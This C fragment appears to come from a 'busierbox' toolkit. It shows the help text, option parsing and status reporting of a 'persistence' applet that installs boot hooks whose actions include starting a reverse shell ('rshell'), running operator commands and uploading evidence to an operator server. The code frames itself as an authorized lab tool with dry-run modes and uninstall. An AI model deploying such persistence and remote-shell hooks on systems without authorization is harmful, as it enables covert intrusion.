    const char *name = BB_RECOVERY_BINARY_NAME;
    int json = 0;
    int i;

    if (is_help(argc, argv) || !strcmp(cmd, "--help")) {
        if (!strcmp(applet, "recovery"))
            puts("recovery is a deprecated compatibility alias for persistence.");
        puts("usage: busierbox persistence --survey|--plan [--json] [--root ROOT]");
        puts("       busierbox persistence status [--json] [--root ROOT] [--name NAME]");
        puts("       busierbox persistence install --method METHOD [--action rshell|evidence-push|evidence-then-rshell|dmesg-push|command|script|status-only] --dry-run|--apply [--json] [--external] [--root ROOT] [--name NAME] [--file SCRIPT] [--target-id ID] [--target-label LABEL] [--target-alias ALIAS] [-- COMMAND]");
        puts("       busierbox persistence uninstall --method METHOD --dry-run|--apply [--json] [--external] [--root ROOT] [--name NAME]");
        puts("Persistence is authorized lab persistence/recovery only. Survey and plan never modify the target.");
        puts("Install and uninstall require an explicit method plus --dry-run or --apply; real-root writes require --external --apply.");
        puts("Evidence actions upload target-initiated evidence to the configured receive-only operator file service.");
        puts("Evidence actions preserve explicit --target-* identity, or BB_TARGET_ID/BB_TARGET_LABEL when set.");
        return 0;
    }
    if (!strcmp(cmd, "install"))
        return applet_recovery_install(argc, argv, 0, applet);
    if (!strcmp(cmd, "uninstall"))
        return applet_recovery_install(argc, argv, 1, applet);

    for (i = 2; i < argc; i++) {
        if (!strcmp(argv[i], "--json"))
            json = 1;
        else if (!strcmp(argv[i], "--root") && i + 1 < argc)
            root = argv[++i];
        else if (!strcmp(argv[i], "--name") && i + 1 < argc)
            name = argv[++i];
        else {
            fprintf(stderr, "%s: unknown or incomplete option %s\n", applet, argv[i]);
            return 2;
        }
    }
    if (!strcmp(cmd, "--survey") || !strcmp(cmd, "survey")) {
        recovery_print_survey(json, root, "survey");
        return 0;
    }
    if (!strcmp(cmd, "--plan") || !strcmp(cmd, "plan")) {
        recovery_print_survey(json, root, "plan");
        if (!json)
            puts("persistence_plan=choose one explicit method, run install --dry-run, then install --apply only when authorized");
        return 0;
    }
    if (!strcmp(cmd, "status")) {
        size_t j;
        int found = 0;
        int installed_count = 0;
        int evidence_action_count = 0;
        int evidence_upload_count = 0;
        int dmesg_action_count = 0;
        int rshell_action_count = 0;
        int rshell_after_evidence_count = 0;
        int command_action_count = 0;
        int script_action_count = 0;
        int operator_supplied_command_count = 0;
        int external_write_required_count = 0;
        int command_queue_enabled_count = 0;
        int hidden_control_channel_count = 0;
        if (json) {
            printf("{\"schema\":1,\"root\":");
            bb_json_string(stdout, root);
            fputs(",\"name\":", stdout);
            bb_json_string(stdout, name);
            fputs(",\"safety\":{\"visible_marked_hooks\":true,\"uninstall_removes_marked_blocks\":true,\"hidden_control_channel\":false,\"command_queue_enabled\":false,\"self_reinstall\":false,\"survives_factory_reset_claim\":false}", stdout);
            fputs(",\"installations\":[", stdout);
        }
        for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
            char action[64], generated[PATH_MAX * 2], path[PATH_MAX], bin[PATH_MAX], script[PATH_MAX];
            if (recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated))) {
                char target_id[256], target_label[256];
                recovery_join(path, sizeof(path), root, recovery_methods[j].path);
                recovery_bin_path(bin, sizeof(bin), root, name);
                recovery_script_path(script, sizeof(script), root, name);
                recovery_command_target_id(generated, target_id, sizeof(target_id));
                recovery_command_target_label(generated, target_label, sizeof(target_label));
                if (json) {
                    printf("%s{\"method\":", found ? "," : "");
                    bb_json_string(stdout, recovery_methods[j].name);
                    fputs(",\"kind\":", stdout); bb_json_string(stdout, recovery_methods[j].kind);
                    fputs(",\"path\":", stdout); bb_json_string(stdout, path);
                    fputs(",\"hook_present\":", stdout); fputs(path_exists(path) ? "true" : "false", stdout);
                    fputs(",\"binary_path\":", stdout); bb_json_string(stdout, bin);
                    fputs(",\"binary_present\":", stdout); fputs(path_exists(bin) ? "true" : "false", stdout);
                    fputs(",\"script_path\":", stdout); bb_json_string(stdout, script);
                    fputs(",\"script_present\":", stdout); fputs(path_exists(script) ? "true" : "false", stdout);
                    fputs(",\"action\":", stdout); bb_json_string(stdout, action[0] ? action : "unknown");
                    fputs(",\"action_category\":", stdout); bb_json_string(stdout, recovery_action_category(action[0] ? action : "unknown"));
                    fputs(",\"uploads_evidence\":", stdout); fputs(recovery_action_uploads_evidence(action) ? "true" : "false", stdout);
                    fputs(",\"collects_dmesg\":", stdout); fputs(recovery_action_collects_dmesg(action) ? "true" : "false", stdout);
                    fputs(",\"starts_rshell\":", stdout); fputs(recovery_action_starts_rshell(action) ? "true" : "false", stdout);
                    fputs(",\"starts_rshell_after_evidence\":", stdout); fputs(recovery_action_starts_rshell_after_evidence(action) ? "true" : "false", stdout);
                    fputs(",\"executes_operator_supplied_command\":", stdout); fputs(recovery_action_executes_operator_supplied_command(action) ? "true" : "false", stdout);
                    fputs(",\"command_queue_enabled\":false", stdout);
                    fputs(",\"hidden_control_channel\":false", stdout);
                    fputs(",\"generated_command\":", stdout); bb_json_string(stdout, generated);
                    fputs(",\"target_identity\":{\"target_id\":", stdout); bb_json_string(stdout, target_id);
                    fputs(",\"target_label\":", stdout); bb_json_string(stdout, target_label);
                    fputs(",\"target_aliases\":", stdout); recovery_print_target_aliases_json(generated);
                    fputs(",\"source\":", stdout);
                    bb_json_string(stdout, (target_id[0] || target_label[0] || recovery_command_has_any_target_alias(generated)) ? "generated-command" : "none");
                    fputs("}", stdout);
                    fputs(",\"survives_reboot\":", stdout); bb_json_string(stdout, recovery_methods[j].survives_reboot);
                    fputs(",\"intrusiveness\":", stdout); bb_json_string(stdout, recovery_methods[j].intrusiveness);
                    fputs(",\"reversibility\":", stdout); bb_json_string(stdout, recovery_methods[j].reversibility);
                    fputs(",\"requires_external_write\":", stdout); bb_json_string(stdout, recovery_methods[j].requires_external_write);
                    fputc('}', stdout);
                } else {
                    printf("installed_method=%s\n", recovery_methods[j].name);
                    printf("installed_kind=%s\n", recovery_methods[j].kind);
                    printf("installed_path=%s\n", path);
                    printf("installed_hook_present=%s\n", path_exists(path) ? "yes" : "no");
                    printf("installed_binary=%s\n", bin);
                    printf("installed_binary_present=%s\n", path_exists(bin) ? "yes" : "no");
                    printf("installed_script=%s\n", script);
                    printf("installed_script_present=%s\n", path_exists(script) ? "yes" : "no");
                    printf("installed_action=%s\n", action[0] ? action : "unknown");
                    if (generated[0])
                        printf("installed_command=%s\n", generated);
                    if (target_id[0])
                        printf("installed_target_id=%s\n", target_id);
                    if (target_label[0])
                        printf("installed_target_label=%s\n", target_label);
                    {
                        const char *cursor = generated;
                        char target_alias[256];
                        while (extract_next_shell_option_value(&cursor, "--target-alias", target_alias, sizeof(target_alias)) == 0) {
                            if (target_alias[0])
                                printf("installed_target_alias=%s\n", target_alias);
                        }
                    }
                    printf("installed_survives_reboot=%s\n", recovery_methods[j].survives_reboot);
                    printf("installed_requires_external_write=%s\n", recovery_methods[j].requires_external_write);
                }
                installed_count++;
                if (!strcmp(action, "evidence-push") || !strcmp(action, "evidence-then-rshell") || !strcmp(action, "dmesg-push"))
                    evidence_action_count++;
                if (recovery_action_uploads_evidence(action))
                    evidence_upload_count++;
                if (recovery_action_collects_dmesg(action))
                    dmesg_action_count++;
                if (recovery_action_starts_rshell(action))
                    rshell_action_count++;
                if (recovery_action_starts_rshell_after_evidence(action))
                    rshell_after_evidence_count++;
                if (!strcmp(action, "command"))
                    command_action_count++;
                if (!strcmp(action, "script"))
                    script_action_count++;
                if (recovery_action_executes_operator_supplied_command(action))
                    operator_supplied_command_count++;
                if (!strcmp(recovery_methods[j].requires_external_write, "yes"))
                    external_write_required_count++;
                found = 1;
            }
        }
        if (json) {
            fputc(']', stdout);
            recovery_print_status_indexes(root, name);
            recovery_print_api_resources(0, 0, 0, installed_count);
            recovery_print_status_api_collections(installed_count);
            printf(",\"summary\":{\"installation_count\":%d,\"evidence_action_count\":%d,\"evidence_upload_count\":%d,\"dmesg_action_count\":%d,\"rshell_action_count\":%d,\"rshell_after_evidence_count\":%d,\"command_action_count\":%d,\"script_action_count\":%d,\"operator_supplied_command_count\":%d,\"external_write_required_count\":%d,\"command_queue_enabled_count\":%d,\"hidden_control_channel_count\":%d,\"all_require_external_write\":%s,\"any_operator_supplied_command\":%s},\"installed\":%s}\n",
                   installed_count,
                   evidence_action_count,
                   evidence_upload_count,
                   dmesg_action_count,
                   rshell_action_count,
                   rshell_after_evidence_count,
                   command_action_count,
                   script_action_count,
                   operator_supplied_command_count,
                   external_write_required_count,
                   command_queue_enabled_count,
                   hidden_control_channel_count,
                   installed_count > 0 && external_write_required_count == installed_count ? "true" : "false",
                   operator_supplied_command_count > 0 ? "true" : "false",
                   found ? "true" : "false");
        } else if (!found) {
            puts("installed=no");
        }
        return 0;
    }
    fprintf(stderr, "%s: unknown command %s\n", applet, cmd);
    return 2;
}
